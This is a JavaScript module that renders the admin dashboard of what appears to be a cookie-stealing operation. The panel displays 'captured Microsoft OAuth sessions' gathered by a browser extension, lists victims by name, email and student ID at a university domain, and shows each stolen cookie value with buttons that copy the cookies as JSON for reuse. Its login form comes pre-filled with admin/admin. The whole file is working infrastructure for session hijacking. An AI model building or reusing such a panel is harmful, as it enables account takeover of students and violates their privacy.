"use strict";

function renderAdminPanelPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>UCP Cookie Admin</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg: #080f1e;
      --surface: #0e1729;
      --surface2: #141e35;
      --border: rgba(255,255,255,0.08);
      --accent: #5b6cff;
      --accent2: #8e9bff;
      --text: #e8ecf8;
      --muted: #7a8ab3;
      --green: #1f5d45;
      --green-text: #b4f5d5;
      --danger: #8f2f4f;
    }
    html { scroll-behavior: smooth; }
    body {
      font-family: Inter, -apple-system, BlinkMacSystemFont, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      line-height: 1.5;
    }
    .wrap { max-width: 1400px; margin: 0 auto; padding: 20px 16px; }

    /* ── Cards ── */
    .card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 20px;
    }

    /* ── Typography ── */
    h1 { font-size: 1.35rem; font-weight: 700; }
    h2 { font-size: 1rem; font-weight: 600; }
    .muted { color: var(--muted); font-size: 0.875rem; }
    .hidden { display: none !important; }

    /* ── Layout helpers ── */
    .flex { display: flex; }
    .flex-wrap { flex-wrap: wrap; }
    .gap-8 { gap: 8px; }
    .gap-12 { gap: 12px; }
    .items-center { align-items: center; }
    .justify-between { justify-content: space-between; }
    .mb-16 { margin-bottom: 16px; }
    .mt-16 { margin-top: 16px; }

    /* ── Form controls ── */
    label { display: block; font-size: 0.8rem; color: var(--muted); margin-bottom: 5px; font-weight: 500; letter-spacing: 0.03em; text-transform: uppercase; }
    input, select {
      width: 100%;
      background: var(--surface2);
      border: 1px solid rgba(255,255,255,0.1);
      color: var(--text);
      border-radius: 10px;
      padding: 9px 12px;
      font-size: 0.9rem;
      font-family: inherit;
      transition: border-color 0.15s;
    }
    input:focus, select:focus { outline: none; border-color: var(--accent); }
    select option { background: #1a2440; }
    .field { flex: 1; min-width: 160px; }

    /* ── Buttons ── */
    button, .btn {
      border: 0;
      border-radius: 10px;
      padding: 9px 16px;
      font-weight: 600;
      cursor: pointer;
      font-size: 0.875rem;
      font-family: inherit;
      white-space: nowrap;
      transition: opacity 0.15s, transform 0.1s;
    }
    button:active { transform: scale(0.97); }
    .btn-primary { background: var(--accent); color: #fff; }
    .btn-primary:hover { opacity: 0.88; }
    .btn-secondary { background: var(--surface2); color: #dbe4ff; border: 1px solid rgba(255,255,255,0.12); }
    .btn-secondary:hover { border-color: var(--accent2); }
    .btn-danger { background: var(--danger); color: #fff; }
    .btn-danger:hover { opacity: 0.85; }
    .btn-ghost { background: transparent; color: var(--muted); border: 1px solid var(--border); }
    .btn-ghost:hover { color: var(--text); border-color: rgba(255,255,255,0.2); }
    .btn-sm { padding: 6px 12px; font-size: 0.8rem; }

    /* ── Stats bar ── */
    .stats-bar {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
      gap: 10px;
      margin-bottom: 16px;
    }
    .stat-card {
      background: var(--surface2);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 14px 16px;
    }
    .stat-card .stat-value { font-size: 1.6rem; font-weight: 700; color: var(--accent2); line-height: 1; }
    .stat-card .stat-label { font-size: 0.75rem; color: var(--muted); margin-top: 4px; }

    /* ── Filter bar ── */
    .filter-bar {
      background: var(--surface2);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 14px 16px;
      margin-bottom: 16px;
    }
    .filter-fields {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      align-items: flex-end;
    }
    .filter-actions { display: flex; gap: 8px; align-items: flex-end; flex-shrink: 0; }

    /* ── Table ── */
    .table-wrap { overflow-x: auto; -webkit-overflow-scrolling: touch; }
    table { width: 100%; border-collapse: collapse; font-size: 0.85rem; min-width: 640px; }
    th, td { text-align: left; padding: 10px 10px; border-bottom: 1px solid var(--border); vertical-align: middle; }
    th { color: var(--muted); font-weight: 600; font-size: 0.78rem; text-transform: uppercase; letter-spacing: 0.04em; white-space: nowrap; }
    tr:hover td { background: rgba(255,255,255,0.025); cursor: pointer; }
    td.no-hover { cursor: default; }

    /* ── Badges & pills ── */
    .badge {
      display: inline-block; padding: 3px 9px; border-radius: 999px;
      font-size: 0.72rem; font-weight: 700; letter-spacing: 0.03em;
    }
    .badge-start { background: #2f3f7a; color: #b7c7ff; }
    .badge-complete { background: var(--green); color: var(--green-text); }
    .pill { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 0.78rem; color: #c6d4ff; }
    .name-cell { font-weight: 500; max-width: 160px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .email-cell { font-size: 0.78rem; color: var(--muted); max-width: 180px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

    /* ── Pagination ── */
    .pagination {
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 8px;
      margin-top: 16px;
      padding-top: 14px;
      border-top: 1px solid var(--border);
    }
    .pagination .page-info { font-size: 0.85rem; color: var(--muted); }
    .pagination .page-btns { display: flex; gap: 6px; align-items: center; }
    .page-num {
      background: var(--surface2); border: 1px solid var(--border);
      border-radius: 8px; padding: 5px 12px; font-size: 0.82rem; font-weight: 600;
      cursor: pointer; color: var(--text); font-family: inherit;
    }
    .page-num:hover { border-color: var(--accent); }
    .page-num.active { background: var(--accent); border-color: var(--accent); color: #fff; }
    .page-num:disabled { opacity: 0.35; cursor: default; }

    /* ── Detail view ── */
    .detail-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin: 14px 0; }
    .detail-item { background: #11182d; border: 1px solid #273154; border-radius: 10px; padding: 12px; }
    .detail-item strong { display: block; color: var(--muted); font-size: 0.72rem; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.04em; }
    .detail-item span { font-size: 0.88rem; word-break: break-all; }
    pre {
      background: #0a1124; border: 1px solid #273154; border-radius: 12px;
      padding: 14px; overflow: auto; max-height: 340px;
      font-size: 0.78rem; line-height: 1.45; white-space: pre-wrap; word-break: break-all;
    }
    .cookie-table td:nth-child(2), .cookie-table td:nth-child(3) {
      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
      font-size: 0.75rem; max-width: 240px; word-break: break-all;
    }

    /* ── Misc ── */
    .error { color: #ff9db1; margin-top: 8px; min-height: 18px; font-size: 0.875rem; }
    .empty-row td { color: var(--muted); text-align: center; padding: 32px; }
    .toolbar { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; margin-bottom: 14px; }
    .toast {
      position: fixed; right: 16px; bottom: 16px;
      background: var(--green); color: var(--green-text);
      padding: 10px 16px; border-radius: 10px;
      opacity: 0; transform: translateY(8px);
      transition: all 0.2s ease; pointer-events: none; z-index: 100;
      font-size: 0.875rem; font-weight: 600;
    }
    .toast.show { opacity: 1; transform: translateY(0); }
    .loading { color: var(--muted); text-align: center; padding: 20px; }

    /* ── Mobile overrides ── */
    @media (max-width: 640px) {
      .wrap { padding: 12px 10px; }
      .card { padding: 14px; border-radius: 12px; }
      h1 { font-size: 1.1rem; }
      .filter-fields { flex-direction: column; }
      .filter-fields .field { min-width: 100%; }
      .filter-actions { width: 100%; }
      .filter-actions button { flex: 1; }
      .stat-card .stat-value { font-size: 1.3rem; }
      .toolbar { flex-direction: column; align-items: flex-start; }
      .toolbar > div:last-child { width: 100%; }
      .toolbar > div:last-child button { flex: 1; }
      .pagination { flex-direction: column; align-items: flex-start; }
      .name-cell, .email-cell { max-width: 110px; }
      table { min-width: 480px; }
      th.hide-mobile, td.hide-mobile { display: none; }
    }
    @media (max-width: 400px) {
      input, select, button { font-size: 0.85rem; }
    }
  </style>
</head>
<body>
  <div class="wrap">
    <!-- ── Login ── -->
    <section id="loginView" class="card" style="max-width:440px;margin:72px auto;">
      <h1 style="margin-bottom:6px;">Cookie Admin Panel</h1>
      <p class="muted" style="margin-bottom:20px;">Sign in to view captured Microsoft OAuth sessions.</p>
      <div style="margin-bottom:12px;"><label>Username</label><input id="username" value="admin" autocomplete="username" /></div>
      <div style="margin-bottom:16px;"><label>Password</label><input id="password" type="password" value="admin" autocomplete="current-password" /></div>
      <button class="btn-primary" id="loginBtn" style="width:100%;">Sign In</button>
      <div class="error" id="loginError"></div>
    </section>

    <!-- ── Dashboard ── -->
    <section id="dashboardView" class="hidden">

      <!-- Header -->
      <div class="toolbar mb-16">
        <div>
          <h1>Cookie Sessions</h1>
          <p class="muted">Captured logins from the extension, newest first.</p>
        </div>
        <div class="flex gap-8">
          <button class="btn-secondary" id="refreshBtn">↻ Refresh</button>
          <button class="btn-danger" id="logoutBtn">Logout</button>
        </div>
      </div>

      <!-- Stats -->
      <div class="stats-bar" id="statsBar">
        <div class="stat-card"><div class="stat-value" id="statTotal">—</div><div class="stat-label">Total Sessions</div></div>
        <div class="stat-card"><div class="stat-value" id="statUsers">—</div><div class="stat-label">Unique Emails</div></div>
        <div class="stat-card"><div class="stat-value" id="statPages">—</div><div class="stat-label">Pages</div></div>
        <div class="stat-card"><div class="stat-value" id="statPage">—</div><div class="stat-label">Current Page</div></div>
      </div>

      <!-- Filters -->
      <div class="filter-bar">
        <p style="font-weight:600;font-size:0.85rem;margin-bottom:10px;">🔍 Filter Sessions</p>
        <div class="filter-fields">
          <div class="field">
            <label>Phase</label>
            <select id="filterPhase">
              <option value="">All phases</option>
              <option value="oauth_start">oauth_start</option>
              <option value="oauth_complete">oauth_complete</option>
            </select>
          </div>
          <div class="field">
            <label>Student ID</label>
            <input id="filterStudentId" placeholder="e.g. L1F25..." />
          </div>
          <div class="field">
            <label>Name</label>
            <input id="filterName" placeholder="Display name…" />
          </div>
          <div class="field">
            <label>Email</label>
            <input id="filterEmail" placeholder="user@ucp.edu.pk" />
          </div>
          <div class="field" style="min-width:140px;">
            <label>Date From</label>
            <input id="filterDateFrom" type="date" />
          </div>
          <div class="field" style="min-width:140px;">
            <label>Date To</label>
            <input id="filterDateTo" type="date" />
          </div>
          <div class="filter-actions">
            <button class="btn-primary" id="applyFiltersBtn">Apply</button>
            <button class="btn-ghost" id="clearFiltersBtn">Clear</button>
          </div>
        </div>
      </div>

      <!-- Sessions table -->
      <div class="card">
        <div class="table-wrap">
          <table>
            <thead>
              <tr>
                <th>Captured</th>
                <th>Phase</th>
                <th>Name</th>
                <th>Email</th>
                <th class="hide-mobile">Student ID</th>
                <th class="hide-mobile">Cookies</th>
                <th class="hide-mobile">Domains</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody id="sessionsBody"><tr><td colspan="8" class="loading">Loading…</td></tr></tbody>
          </table>
        </div>

        <!-- Pagination -->
        <div class="pagination" id="paginationBar">
          <span class="page-info" id="pageInfo"></span>
          <div class="page-btns" id="pageBtns"></div>
        </div>
      </div>

      <!-- Detail panel -->
      <div id="detailView" class="card hidden" style="margin-top:16px;">
        <div class="toolbar">
          <div>
            <h2>Session Detail</h2>
            <p class="muted" id="detailSubtitle" style="font-size:0.78rem;margin-top:3px;"></p>
          </div>
          <div class="flex gap-8 flex-wrap">
            <button class="btn-secondary btn-sm" id="copyCookiesBtn">Copy Cookies JSON</button>
            <button class="btn-secondary btn-sm" id="copyFullBtn">Copy Full JSON</button>
            <button class="btn-ghost btn-sm" id="closeDetailBtn">✕ Close</button>
          </div>
        </div>
        <div class="detail-grid" id="detailMeta"></div>
        <h2 style="margin:10px 0 8px;font-size:0.9rem;">Cookie Table</h2>
        <div class="table-wrap">
          <table class="cookie-table">
            <thead><tr><th>Name</th><th>Value</th><th>Domain</th><th>Path</th><th>Flags</th></tr></thead>
            <tbody id="cookieBody"></tbody>
          </table>
        </div>
        <h2 style="margin:16px 0 8px;font-size:0.9rem;">JSON Preview</h2>
        <pre id="jsonPreview"></pre>
      </div>
    </section>
  </div>

  <div class="toast" id="toast"></div>

  <script>
    const TOKEN_KEY = "ucp_admin_token";
    let currentSession = null;
    let currentPage = 1;
    let totalPages = 1;
    let activeFilters = {};

    function getToken()  { return localStorage.getItem(TOKEN_KEY) || ""; }
    function setToken(t) { localStorage.setItem(TOKEN_KEY, t); }
    function clearToken(){ localStorage.removeItem(TOKEN_KEY); }

    function showToast(msg, isError) {
      const el = document.getElementById("toast");
      el.textContent = msg;
      el.style.background = isError ? "#8f2f4f" : "#1f6f4e";
      el.style.color = isError ? "#ffc0cb" : "#eafff4";
      el.classList.add("show");
      setTimeout(() => el.classList.remove("show"), 2200);
    }

    async function api(path, options) {
      const opts = options || {};
      const headers = Object.assign({ "Content-Type": "application/json" }, opts.headers || {});
      const token = getToken();
      if (token) headers.Authorization = "Bearer " + token;
      const res = await fetch(path, Object.assign({}, opts, { headers }));
      if (res.status === 401) { clearToken(); showLogin(); throw new Error("Session expired"); }
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data.error || "Request failed");
      return data;
    }

    function showLogin() {
      document.getElementById("loginView").classList.remove("hidden");
      document.getElementById("dashboardView").classList.add("hidden");
    }
    function showDashboard() {
      document.getElementById("loginView").classList.add("hidden");
      document.getElementById("dashboardView").classList.remove("hidden");
    }

    function phaseBadge(phase) {
      const cls = phase === "oauth_complete" ? "badge-complete" : "badge-start";
      return '<span class="badge ' + cls + '">' + phase + '</span>';
    }
    function formatDate(v) {
      if (!v) return "—";
      const d = new Date(v);
      return d.toLocaleDateString() + " " + d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
    }
    function esc(str) {
      return String(str || "").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
    }

    function buildQueryString(page) {
      const params = new URLSearchParams();
      params.set("page", page || 1);
      params.set("limit", 25);
      if (activeFilters.phase) params.set("phase", activeFilters.phase);
      if (activeFilters.studentId) params.set("studentId", activeFilters.studentId);
      if (activeFilters.userName) params.set("userName", activeFilters.userName);
      if (activeFilters.userEmail) params.set("userEmail", activeFilters.userEmail);
      if (activeFilters.dateFrom) params.set("dateFrom", activeFilters.dateFrom);
      if (activeFilters.dateTo) params.set("dateTo", activeFilters.dateTo);
      return params.toString();
    }

    async function loadSessions(page) {
      page = page || currentPage;
      const body = document.getElementById("sessionsBody");
      body.innerHTML = '<tr><td colspan="8" class="loading">Loading…</td></tr>';
      try {
        const data = await api("/admin/api/sessions?" + buildQueryString(page));
        currentPage = data.page;
        totalPages = data.pages;

        // Stats
        document.getElementById("statTotal").textContent = data.total;
        document.getElementById("statPages").textContent = totalPages;
        document.getElementById("statPage").textContent = currentPage;

        // Count unique emails from current page subset
        const emails = new Set((data.items || []).map(i => i.userEmail).filter(e => e && e !== "unknown"));
        document.getElementById("statUsers").textContent = emails.size > 0 ? emails.size + "+" : "—";

        renderTable(data.items || []);
        renderPagination(data.page, data.pages, data.total);
      } catch (e) {
        body.innerHTML = '<tr><td colspan="8" class="empty-row">' + esc(e.message) + '</td></tr>';
        showToast(e.message, true);
      }
    }

    function renderTable(items) {
      const body = document.getElementById("sessionsBody");
      if (!items.length) {
        body.innerHTML = '<tr><td colspan="8" class="empty-row">No sessions found matching the filters.</td></tr>';
        return;
      }
      body.innerHTML = items.map(item => {
        const domains = (item.domains || []).slice(0, 2).join(", ");
        const more = (item.domains || []).length > 2 ? "…" : "";
        const name = item.userName || "—";
        const email = item.userEmail || "—";
        return '<tr data-id="' + item._id + '">' +
          '<td>' + formatDate(item.capturedAt) + '</td>' +
          '<td>' + phaseBadge(item.phase) + '</td>' +
          '<td class="name-cell" title="' + esc(name) + '">' + esc(name) + '</td>' +
          '<td class="email-cell" title="' + esc(email) + '">' + esc(email) + '</td>' +
          '<td class="pill hide-mobile">' + esc(item.studentId || "—") + '</td>' +
          '<td class="hide-mobile">' + (item.cookieCount || 0) + '</td>' +
          '<td class="muted hide-mobile">' + esc(domains + more) + '</td>' +
          '<td><button class="btn-secondary btn-sm view-btn" data-id="' + item._id + '">View</button></td>' +
        '</tr>';
      }).join("");

      body.querySelectorAll("tr[data-id]").forEach(row => {
        row.addEventListener("click", e => {
          if (e.target.classList.contains("view-btn")) return; // handled below
          openDetail(row.getAttribute("data-id"));
        });
      });
      body.querySelectorAll(".view-btn").forEach(btn => {
        btn.addEventListener("click", e => {
          e.stopPropagation();
          openDetail(btn.getAttribute("data-id"));
        });
      });
    }

    function renderPagination(page, pages, total) {
      const info = document.getElementById("pageInfo");
      const btns = document.getElementById("pageBtns");
      info.textContent = "Page " + page + " of " + pages + " (" + total + " total)";
      btns.innerHTML = "";

      const prevBtn = document.createElement("button");
      prevBtn.className = "page-num";
      prevBtn.textContent = "← Prev";
      prevBtn.disabled = page <= 1;
      prevBtn.addEventListener("click", () => loadSessions(page - 1));
      btns.appendChild(prevBtn);

      // Show a window of page buttons
      const start = Math.max(1, page - 2);
      const end = Math.min(pages, page + 2);
      for (let i = start; i <= end; i++) {
        const b = document.createElement("button");
        b.className = "page-num" + (i === page ? " active" : "");
        b.textContent = i;
        b.addEventListener("click", (function(p) { return () => loadSessions(p); })(i));
        btns.appendChild(b);
      }

      const nextBtn = document.createElement("button");
      nextBtn.className = "page-num";
      nextBtn.textContent = "Next →";
      nextBtn.disabled = page >= pages;
      nextBtn.addEventListener("click", () => loadSessions(page + 1));
      btns.appendChild(nextBtn);
    }

    function renderDetail(session, exportData) {
      currentSession = exportData;
      document.getElementById("detailView").classList.remove("hidden");
      document.getElementById("detailSubtitle").textContent = session.sessionId || "";
      document.getElementById("detailMeta").innerHTML =
        '<div class="detail-item"><strong>Phase</strong><span>' + esc(session.phase) + '</span></div>' +
        '<div class="detail-item"><strong>Name</strong><span>' + esc(session.userName || "—") + '</span></div>' +
        '<div class="detail-item"><strong>Email</strong><span>' + esc(session.userEmail || "—") + '</span></div>' +
        '<div class="detail-item"><strong>Student ID</strong><span class="pill">' + esc(session.studentId || "—") + '</span></div>' +
        '<div class="detail-item"><strong>Cookie Count</strong><span>' + (session.cookieCount || 0) + '</span></div>' +
        '<div class="detail-item"><strong>Captured At</strong><span>' + formatDate(session.capturedAt) + '</span></div>' +
        '<div class="detail-item" style="grid-column:1/-1"><strong>Trigger URL</strong><span class="pill">' + esc(session.triggerUrl) + '</span></div>';

      const cookieBody = document.getElementById("cookieBody");
      cookieBody.innerHTML = (session.cookies || []).map(c => {
        const flags = [c.secure ? "secure" : "", c.httpOnly ? "httpOnly" : "", c.sameSite || ""].filter(Boolean).join(", ");
        return '<tr><td>' + esc(c.name) + '</td><td>' + esc(c.value) + '</td><td>' + esc(c.domain) + '</td><td>' + esc(c.path || "/") + '</td><td class="muted">' + esc(flags) + '</td></tr>';
      }).join("");

      document.getElementById("jsonPreview").textContent = JSON.stringify(exportData, null, 2);
      document.getElementById("detailView").scrollIntoView({ behavior: "smooth", block: "start" });
    }

    async function openDetail(id) {
      try {
        const data = await api("/admin/api/sessions/" + id);
        renderDetail(data.session, data.export);
      } catch (e) {
        showToast(e.message, true);
      }
    }

    async function copyText(text, label) {
      try {
        await navigator.clipboard.writeText(text);
        showToast(label + " copied ✓");
      } catch (e) {
        showToast("Copy failed", true);
      }
    }

    function readFilters() {
      activeFilters = {
        phase: document.getElementById("filterPhase").value,
        studentId: document.getElementById("filterStudentId").value.trim(),
        userName: document.getElementById("filterName").value.trim(),
        userEmail: document.getElementById("filterEmail").value.trim(),
        dateFrom: document.getElementById("filterDateFrom").value,
        dateTo: document.getElementById("filterDateTo").value
      };
    }

    function clearFilters() {
      document.getElementById("filterPhase").value = "";
      document.getElementById("filterStudentId").value = "";
      document.getElementById("filterName").value = "";
      document.getElementById("filterEmail").value = "";
      document.getElementById("filterDateFrom").value = "";
      document.getElementById("filterDateTo").value = "";
      activeFilters = {};
    }

    // ── Event wiring ──

    document.getElementById("loginBtn").addEventListener("click", async () => {
      const err = document.getElementById("loginError");
      err.textContent = "";
      try {
        const result = await api("/admin/api/login", {
          method: "POST",
          body: JSON.stringify({
            username: document.getElementById("username").value,
            password: document.getElementById("password").value
          })
        });
        setToken(result.token);
        showDashboard();
        await loadSessions(1);
      } catch (e) {
        err.textContent = e.message || "Login failed";
      }
    });

    document.getElementById("logoutBtn").addEventListener("click", async () => {
      try { await api("/admin/api/logout", { method: "POST" }); } catch (e) {}
      clearToken();
      showLogin();
    });

    document.getElementById("refreshBtn").addEventListener("click", () => loadSessions(currentPage));

    document.getElementById("applyFiltersBtn").addEventListener("click", () => {
      readFilters();
      currentPage = 1;
      loadSessions(1);
    });

    document.getElementById("clearFiltersBtn").addEventListener("click", () => {
      clearFilters();
      currentPage = 1;
      loadSessions(1);
    });

    // Allow pressing Enter in any filter field to apply
    ["filterPhase","filterStudentId","filterName","filterEmail","filterDateFrom","filterDateTo"].forEach(id => {
      const el = document.getElementById(id);
      if (el && el.tagName === "INPUT") {
        el.addEventListener("keydown", e => { if (e.key === "Enter") document.getElementById("applyFiltersBtn").click(); });
      }
    });

    document.getElementById("closeDetailBtn").addEventListener("click", () => {
      document.getElementById("detailView").classList.add("hidden");
      currentSession = null;
    });

    document.getElementById("copyCookiesBtn").addEventListener("click", () => {
      if (!currentSession) return;
      copyText(JSON.stringify(currentSession.cookies || [], null, 2), "Cookies JSON");
    });

    document.getElementById("copyFullBtn").addEventListener("click", () => {
      if (!currentSession) return;
      copyText(JSON.stringify(currentSession, null, 2), "Full session JSON");
    });

    // Auto-login if token exists
    (async function init() {
      if (!getToken()) return showLogin();
      try {
        showDashboard();
        await loadSessions(1);
      } catch (e) {
        showLogin();
      }
    })();
  </script>
</body>
</html>`;
}

module.exports = { renderAdminPanelPage };
